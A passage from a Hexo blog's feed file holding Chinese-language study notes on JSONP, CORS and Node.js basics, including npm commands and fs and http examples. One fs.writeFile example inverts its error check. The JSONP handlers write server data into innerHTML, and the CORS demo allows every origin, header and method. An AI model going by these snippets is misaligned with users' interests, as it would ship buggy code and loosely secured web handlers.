class="subst">$&#123;<span class="built_in">JSON</span>.stringify(data)&#125;</span>)`</span>);</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//html</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">handle</span>(<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> res = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      res.<span class="property">innerHTML</span> = data.<span class="property">name</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8000/jsonp&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4.4-jsonp-实践">4.4 jsonp 实践<a title="#4.4-jsonp-实践" href="#4.4-jsonp-实践"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//server</span></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/jsonp-exe&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// res.send(&#x27;console.log(hello jsonp)&#x27;)</span></span><br><span class="line">  <span class="keyword">const</span> data = &#123;</span><br><span class="line">    <span class="attr">exist</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">mes</span>: <span class="string">&#x27;用户名存在&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">`handle(<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(data)&#125;</span>)`</span>);</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> p = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;p&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> input = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;input&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">handle</span>(<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    input.<span class="property">style</span>.<span class="property">border</span> = <span class="string">&#x27;1px solid red&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    p.<span class="property">innerHTML</span> = data.<span class="property">mes</span>;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  input.<span class="property">onblur</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 获取用户的输入</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> username = <span class="variable language_">this</span>.<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 向服务器发送请求 检测用户是否存在</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 1.创建script</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 2.设置标签 src</span></span></span><br><span class="line"><span class="language-javascript">    script.<span class="property">src</span> = <span class="string">&#x27;http://127.0.0.1:8000/jsonp-exe&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 3.插入到dom</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4.5-jq-jsonp">4.5 jq-jsonp<a title="#4.5-jq-jsonp" href="#4.5-jq-jsonp"></a></h3><h3 id="4.6-cors">4.6 cors<a title="#4.6-cors" href="#4.6-cors"></a></h3><img src="https://s1.328888.xyz/2022/04/09/X3BLX.jpg"><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//server</span></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/cors&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 1.设置响应头，允许跨域</span></span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">  <span class="comment">// 2.设置响应头</span></span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Headers&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Methods&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">  <span class="comment">// 3.响应体</span></span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;hello cors&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> text = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;textarea&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  btn.<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:8000/cors&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        text.<span class="property">value</span> = xhr.<span class="property">response</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nodejs 学习笔记</title>
      <link href="/learningNotes/nodejs"/>
      <url>/learningNotes/nodejs</url>
      
        <content type="html"><![CDATA[<h2 id="0.其他知识点">0.其他知识点<a title="#0.其他知识点" href="#0.其他知识点"></a></h2><h3 id="0.1-代码风格">0.1 代码风格<a title="#0.1-代码风格" href="#0.1-代码风格"></a></h3><ul><li><p>JavaScript Standard Style</p></li><li><p>Airbnb JavaScript style</p></li><li><p>if 使用 五分号风格 只要注意在 当每一行是以 ( [ ` 这3个开头时 前要补空格</p><blockquote><p>``打印字符 es6 模板字符串 支持 换行 方便拼接</p></blockquote></li></ul><p>快捷键：选择长度不等 <code>alt 选 放开 ctrl + 向右</code></p><p>​             选相同的：<code>先选中 然后 ctrl + d</code></p><h3 id="0.2-浏览器收到html响应的解析过程">0.2 浏览器收到html响应的解析过程<a title="#0.2-浏览器收到html响应的解析过程" href="#0.2-浏览器收到html响应的解析过程"></a></h3><p>从上到下依次解析，当在解析的过程中，如果发现有：</p><p>link、script、img、iframe、video、audio 等</p><p>带有 src 或者 href(除 a ) 这种具有外链的资源 属性的标签时</p><p>浏览器会自动对这些资源发起新的请求</p><h3 id="0.3-相对路径的-./">0.3 相对路径的 ./<a title="#0.3-相对路径的-./" href="#0.3-相对路径的-./"></a></h3><ul><li><p>文件操作中的相对路径可以省略 ./</p><p><strong>使用的所有文件操作的 api 都是异步的</strong></p><p>fs.readFile(‘data/a.txt’, …)</p></li><li><p>在模块加载中 相对路径不能省略 ./</p><p>require(‘./data/foo.js’)</p></li></ul><blockquote><p>if 只有 / 则会找到 根目录 ‘C: …’ 绝对路径</p></blockquote><h3 id="0.4-修改完代码自动重启服务器">0.4 修改完代码自动重启服务器<a title="#0.4-修改完代码自动重启服务器" href="#0.4-修改完代码自动重启服务器"></a></h3><p>使用第三方命令行工具 nodemon 解决</p><p>其是 基于 node.js 开发的第三方工具 需要全局安装</p><ol><li><p>安装 ：<code>npm install --global nodemon</code></p></li><li><p>使用 ：<code>nodemon app.js</code> 用nodemon 代替 node 启动文件</p><blockquote><p>会监视文件变化 然后自动重启服务器</p></blockquote></li></ol><h3 id="0.5-&lt;font-color='red'&gt;回调函数:获取异步操作的结果&lt;/font&gt;">0.5 <font color='red'>回调函数:获取异步操作的结果</font><a title="#0.5-&lt;font-color='red'&gt;回调函数:获取异步操作的结果&lt;/font&gt;" href="#0.5-&lt;font-color='red'&gt;回调函数:获取异步操作的结果&lt;/font&gt;"></a></h3><p><strong>如果需要获取一个函数中异步操作的结果，则必须通过回调函数来获取</strong></p><blockquote><p>学node的精华所在 封装异步 api 5.6中有案例</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">callback</span>)&#123;</span><br><span class="line">    <span class="comment">//callback = function(data)&#123; console.log(data) &#125;</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> data = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">        <span class="title function_">callback</span>(data);</span><br><span class="line">    &#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 外部得到 data</span></span><br><span class="line"><span class="title function_">fn</span>(<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="0.6-npm-package.js">0.6 npm package.js<a title="#0.6-npm-package.js" href="#0.6-npm-package.js"></a></h3><ol><li><p>npm</p><p>node package manager</p></li><li><p>package.js</p><p>包描述文件 (项目说明书)</p><p>npm 下载东西的时候 加 - - save (保存项目第三方包的依赖信息 dependencies)</p><p>可以在终端 npm init 初始化项目 创建</p></li></ol><ul><li>当把node_mouldes 文件夹删除后 因为有 package.js 中的依赖信息 所以<strong>直接终端 npm install</strong> 就会重新下回来</li></ul><h4 id="0.6.1-npm-网站">0.6.1 npm 网站<a title="#0.6.1-npm-网站" href="#0.6.1-npm-网站"></a></h4><p><a href="https://npmjs.com" target="_blank">官方网站</a></p><p>第三方包 在哪来的 可以搜索下载上传第三方包</p><h4 id="0.6.2-npm-命令行工具">0.6.2 npm 命令行工具<a title="#0.6.2-npm-命令行工具" href="#0.6.2-npm-命令行工具"></a></h4><p>npm 第二层含义就是 命令行工具 只要安装node就安装了npm</p><ol><li>查版本号 : <code>npm --version</code></li><li>升级 npm : <code>npm install --global npm</code></li></ol><h4 id="0.6.3-常用命令">0.6.3 常用命令<a title="#0.6.3-常用命令" href="#0.6.3-常用命令"></a></h4><ul><li><p>生成项目 : <code>npm init</code></p><ul><li><code>npm init --yes</code> 跳过向导 快速生成</li></ul></li><li><p>下载第三方包 : <code>npm install</code>  <code>npm install 包名</code>  <code>npm install --save</code></p></li><li><p>删除包 : <code>npm uninstall 包</code> 只删除 if有依赖项就会保存</p><p>​              <code>npm uninstall --save 包</code>  删除包 以及其依赖项</p></li><li><p>查看使用帮助 : <code>npm --help</code></p></li><li><p>查看指定命令使用帮助 : <code>npm 命令 --help</code></p></li><li><p>查看npm配置信息 : <code>npm config list</code></p></li></ul><h4 id="0.6.4-解决-npm-被墙问题">0.6.4 解决 npm 被墙问题<a title="#0.6.4-解决-npm-被墙问题" href="#0.6.4-解决-npm-被墙问题"></a></h4><p>使用淘宝镜像 <code>cnpm</code></p><blockquote><p>npm 服务器在国外</p></blockquote><ol><li>安装 cnpm <code>npm install --global cnpm</code></li><li><code>cnpm</code>直接替换 命令 <code>npm</code></li></ol><p>if 不想下cnpm 可以每次这样使用 <code>npm install jquery --registry=https://registry.npm.taobao.org</code></p><p>也可以将<code>npm config set registry=https://registry.npm.taobao.org</code> 这个配置到文件中 每次 npm就会使用cnpm</p><h3 id="0.7-package-lock.json">0.7 package-lock.json<a title="#0.7-package-lock.json" href="#0.7-package-lock.json"></a></h3><p>npm 5 后，在安装包的时候，npm就会生成或者更新 <code>package-lock.json</code>这个文件</p><ul><li>npm5 后安装包 不需要加 <code>--save</code> 都会自动保存依赖信息</li><li>当安装包时 会自动创建或更新这个文件 (在项目的根目录下)</li><li>改文件会保存 <code>node_modules</code> 中所有包的信息(版本、下载地址)<ul><li>这样的话 重新 <code>npm install</code> 时 速度可以提升</li></ul></li><li>lock -&gt; 锁<ul><li>锁定版本： 正常来说 项目依赖了 1.1.1,在重新下载时 会下载最新版本,但希望可以锁住版本，改文件就可以锁住版本号，防止自动升级</li></ul></li></ul><h3 id="0.8-find-和-findindex-的原理">0.8 find 和 findIndex 的原理<a title="#0.8-find-和-findindex-的原理" href="#0.8-find-和-findindex-的原理"></a></h3><p>es6 新增的方法</p><blockquote><p>接收一个方法作为参数 方法内有一个返回条件</p><p>find 会遍历所有元素 执行给的带有条件返回值的函数</p><p>if 符合改条件的元素会作为find方法的返回值</p><p>if 无符号 就返回 undefined</p></blockquote><p>find 和 findIndex 原理：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> users = [ &#123;<span class="attr">id</span>:<span class="number">1</span>,<span class="attr">name</span>:<span class="string">&#x27;lili&#x27;</span>&#125;, &#123;<span class="attr">id</span>:<span class="number">2</span>,<span class="attr">name</span>:<span class="string">&#x27;lii&#x27;</span>&#125;, &#123;<span class="attr">id</span>:<span class="number">3</span>,<span class="attr">name</span>:<span class="string">&#x27;li&#x27;</span>&#125;]</span><br><span class="line"></span><br><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">myFind</span> = <span class="keyword">function</span>(<span class="params">conditionFunc</span>)&#123;</span><br><span class="line">    <span class="comment">//conditionFunc = function(item index)&#123; return item.id === 2&#125;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">length</span>; i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_">conditionFunc</span>(<span class="variable language_">this</span>[i],i) )&#123;  <span class="comment">//this[i] = item ，i= index</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>[i];   <span class="comment">//if return i 就是 findIndex</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ret = users.<span class="title function_">myFind</span>(<span class="keyword">function</span>(<span class="params">item,index</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> item.<span class="property">id</span> === <span class="number">2</span>;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ret);  <span class="comment">//&#123;id:2,name:&#x27;lii&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用</span></span><br><span class="line">arr.<span class="title function_">find</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> item.<span class="property">id</span> === id</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="0.9-reduce">0.9 reduce<a title="#0.9-reduce" href="#0.9-reduce"></a></h3><p>[1,2,3].reduce( (prev,curr) =&gt; { return prev + curr} )  //6相加</p><h2 id="1.-node.js介绍">1. node.js介绍<a title="#1.-node.js介绍" href="#1.-node.js介绍"></a></h2><h3 id="1.1-能做什么">1.1 能做什么<a title="#1.1-能做什么" href="#1.1-能做什么"></a></h3><ul><li>web 服务器后台</li><li>命令行工具<ul><li>npm - node</li><li>git - c</li><li>hexo - node</li><li>…</li></ul></li></ul><blockquote><p>前端接触最多的就是命令行工具，主要是用第三方的</p><ul><li>webpack</li><li>gulp</li><li>npm</li></ul></blockquote><h3 id="1.2-预备知识">1.2 预备知识<a title="#1.2-预备知识" href="#1.2-预备知识"></a></h3><p>html -&gt; css -&gt; js -&gt; 简单命令行操作 -&gt; 服务端开发经验更好</p><h3 id="1.3-资源">1.3 资源<a title="#1.3-资源" href="#1.3-资源"></a></h3><ul><li><p>&lt;深入浅出 node.js&gt;</p><ul><li>偏理论，无实战内容</li><li>对理解底层有帮助</li><li>可结合课程看</li></ul></li><li><p>&lt;node.js 权威指南&gt;</p><ul><li>api 讲解</li><li>无实战</li></ul></li><li><p>JavaScript 标准参考教程(alpha) : <a href="http://javascript.ruanyifeng.com/">http://javascript.ruanyifeng.com/</a></p></li><li><p>node 入门 : <a href="https://www.nodebeginner.org/index-zh-cn.html">https://www.nodebeginner.org/index-zh-cn.html</a></p></li><li><p>官方 api 文档 ：<a href="https://nodejs.org/dist/latest-v6.x/docs/api/">https://nodejs.org/dist/latest-v6.x/docs/api/</a></p></li><li><p>中文文档 (版本较旧) ：<a href="http://www.nodeclass.com/api/node.html">http://www.nodeclass.com/api/node.html</a></p></li><li><p>CNODE 社区 ：<a href="https://cnodejs.org">https://cnodejs.org</a></p></li><li><p>CNODE - 新手入门 ：<a href="http://cnodejs.org/getstart">http://cnodejs.org/getstart</a></p><blockquote><p>es6 ： &lt;ECMAScript 6 入门&gt; —阮一峰</p><p>​           &lt;深入理解 ES6&gt;  — 尼古拉斯</p></blockquote></li></ul><h3 id="1.4-这门课程能学到的东西">1.4 这门课程能学到的东西<a title="#1.4-这门课程能学到的东西" href="#1.4-这门课程能学到的东西"></a></h3><ul><li><p>b/s 编程模型</p><ul><li><p>Browser - Server</p></li><li><p>back - end</p><blockquote><p>任何服务端技术 的 bs 编程模型都是一样的，和语言无关</p><p>node 只是作为学习 bs 编程模型的一个工具</p></blockquote></li></ul></li><li><p>模块化编程</p><ul><li>RequireJS</li><li>SeaJS</li><li><code>@import('文件路径')</code></li></ul></li><li><p>node 常用 api</p></li><li><p>异步编程</p><ul><li>回调函数</li><li>Promise</li><li>async</li><li>generator</li></ul></li><li><p>Express Web开发框架</p></li><li><p>Ecmascript6</p><ul><li>课程中穿插讲解</li></ul></li><li><p>…</p></li></ul><h2 id="2.-起步">2. 起步<a title="#2.-起步" href="#2.-起步"></a></h2><h3 id="2.1-安装-node-环境">2.1 安装 node 环境<a title="#2.1-安装-node-环境" href="#2.1-安装-node-环境"></a></h3><ul><li>查看版本号</li><li>下载： 官网 -&gt; 安装 -&gt; 确认安装是否成功 -&gt; 环境变量</li></ul><h3 id="2.2-node-执行-js-文件">2.2 node 执行 js 文件<a title="#2.2-node-执行-js-文件" href="#2.2-node-执行-js-文件"></a></h3><ol><li>cmd 打开到 js 文件所在的文件夹</li><li>使用 <code>node 文件名.js</code>运行 js 文件</li></ol><blockquote><p>文件名 不要用 node.js</p><p>if 用这个  node node.js 就会打开文件</p><p>最好不使用中文</p></blockquote><h3 id="2.3-node-特点(与浏览器相比)">2.3 node 特点(与浏览器相比)<a title="#2.3-node-特点(与浏览器相比)" href="#2.3-node-特点(与浏览器相比)"></a></h3><h4 id="2.3.1-ecmascript">2.3.1 ecmascript<a title="#2.3.1-ecmascript" href="#2.3.1-ecmascript"></a></h4><ul><li><p>解析执行JavaScript</p></li><li><p>无 dom bom</p><blockquote><p>window document is not defined</p></blockquote></li></ul><h4 id="2.3.2-核心模块">2.3.2 核心模块<a title="#2.3.2-核心模块" href="#2.3.2-核心模块"></a></h4><p>在使用前都需要 const mondel = require(‘模块名称’)</p><p><a href="http://nodejs.cn/api/" target="_blank">官网api</a> 可以看到核心模块</p><p>常用 ： fs os path request http</p><p>例子：</p><ul><li><h4 id="可以读写文件">可以读写文件<a title="#可以读写文件" href="#可以读写文件"></a></h4><ul><li><p>读：</p><p>1.使用requirt 加载 fs 核心模块</p><p>2.使用fs.readFile 读取文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一个参数 读取的文件路径</span></span><br><span class="line"><span class="comment">//第二个参数  回调函数      =&gt; error  读失败 error错误对象; 读成功 error=null</span></span><br><span class="line"><span class="comment">//                          data   读失败 error错误对象; 读成功 data 读取到的数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 因为数据 是 二进制 转为 16进制 的 ，如果要看懂的话 要用toString</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line">fs.<span class="title function_">readFile</span>(<span class="string">&#x27;../nodejs.md&#x27;</span>, <span class="keyword">function</span> (<span class="params">error, data</span>) &#123;</span><br><span class="line">  <span class="comment">// console.log(data);</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="title function_">toString</span>());</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>写：</p><p>1.使用requirt 加载 fs 核心模块</p><p>2.使用fs.writeFile 读取文件</p><blockquote><p>要自己创建文件夹</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一个参数 文件路径</span></span><br><span class="line"><span class="comment">// 第二个参数 文件内容</span></span><br><span class="line"><span class="comment">// 第三个参数 回调函数  其参数error =&gt; 成功 error=null 失败 error=错误对象</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line">fs.<span class="title function_">writeFile</span>(<span class="string">&#x27;./data/01writefile&#x27;</span>, <span class="string">&#x27;2021.08.16 to learn file&#x27;</span>, <span class="keyword">function</span> (<span class="params">error</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ok 200&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(error);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul></li><li><h4 id="http">http<a title="#http" href="#http"></a></h4><ol><li><p>使用node非常轻松的构建一个web服务器</p><p>在node中专门提供了一个核心模块：http - 职责 就是帮你创建编写服务器的</p><p>1.加载核心模块 http</p><p>2.使用http.createServer() 创建一个web服务器 返回一个Server实例</p><p>3.服务器的用处 提供对数据的服务 -&gt; 发请求 -&gt; 接收请求 -&gt; 处理请求 -&gt; 发送响应</p><p>注册request请求事件 当客户端请求过来 会自动触发服务器的request请求事件，执行回调函数</p><p>回调函数有两个对象参数 request，response</p><ul><li><p>requset.url 会把http://127.0.0.1:3000 后面的东西返回到终端 只要每次触发request就会</p></li><li><p>response.write() 会把括号内的 字符串 响应到客户端 可以用多次 但是最后要加response.end()</p><ul><li>也可以直接在 response.end(“响应数据”) <strong>响应数据只能是二进制数据 或者 字符串</strong></li></ul></li><li><p>可以利用 不同的 request.url 响应不同的 write内容到客户端</p></li><li><p>response.setHeader(‘Content-Type’, ‘text/plain;charset=utf-8’);  <strong>解决乱码</strong></p><p>在http 协议中 Content-Type 是 数据内容的类型  <a href="https://tool.oschina.net/commons" target="_blank">oschina 网站 查表</a></p><p>text/plain：普通文本 ； text/html：html ；image/jpeg：jpg (不用指定编码 只有<strong>字符数据要</strong>)；</p></li></ul><p>4.绑定端口号，启动服务器</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&quot;http&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> server = http.<span class="title function_">createServer</span>();</span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;request&#x27;</span>, <span class="keyword">function</span> (<span class="params">request, response</span>) &#123;</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// 解决乱码问题 浏览器在不知道什么编码时 会用操作系统的默认编码 gbk</span></span><br><span class="line">  response.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;200 ok + url: &quot;</span> + request.<span class="property">url</span>);</span><br><span class="line">  <span class="keyword">if</span> (request.<span class="property">url</span> == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">    response.<span class="title function_">write</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    response.<span class="title function_">write</span>(<span class="string">&#x27;other&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  response.<span class="title function_">end</span>()</span><br><span class="line">&#125;)</span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//因为启动需要时间 所以整一个回调函数</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span 